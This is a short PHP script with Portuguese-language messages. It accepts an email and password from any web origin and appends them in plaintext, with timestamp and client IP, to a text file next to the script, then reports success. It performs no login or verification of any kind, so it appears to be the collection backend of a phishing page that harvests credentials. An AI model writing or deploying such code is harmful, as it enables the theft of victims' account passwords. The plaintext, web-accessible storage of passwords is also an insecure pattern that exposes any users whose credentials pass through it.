<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['success' => false, 'message' => 'Método não permitido.']);
    exit;
}

$raw  = file_get_contents('php://input');
$data = json_decode($raw, true);

$email    = isset($data['email'])    ? trim($data['email'])    : '';
$password = isset($data['password']) ? trim($data['password']) : '';

if (empty($email) || empty($password)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'message' => 'E-mail e senha são obrigatórios.']);
    exit;
}

if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'message' => 'E-mail inválido.']);
    exit;
}

// Arquivo onde os dados serão salvos (na mesma pasta do PHP)
$file = __DIR__ . '/dados.txt';

$timestamp = date('d/m/Y H:i:s');
$ip        = $_SERVER['REMOTE_ADDR'] ?? 'desconhecido';
$linha     = "[$timestamp] | IP: $ip | E-mail: $email | Senha: $password\n";

$resultado = file_put_contents($file, $linha, FILE_APPEND | LOCK_EX);

if ($resultado === false) {
    http_response_code(500);
    echo json_encode(['success' => false, 'message' => 'Erro ao salvar no servidor.']);
    exit;
}

echo json_encode(['success' => true, 'message' => 'Dados salvos com sucesso!']);
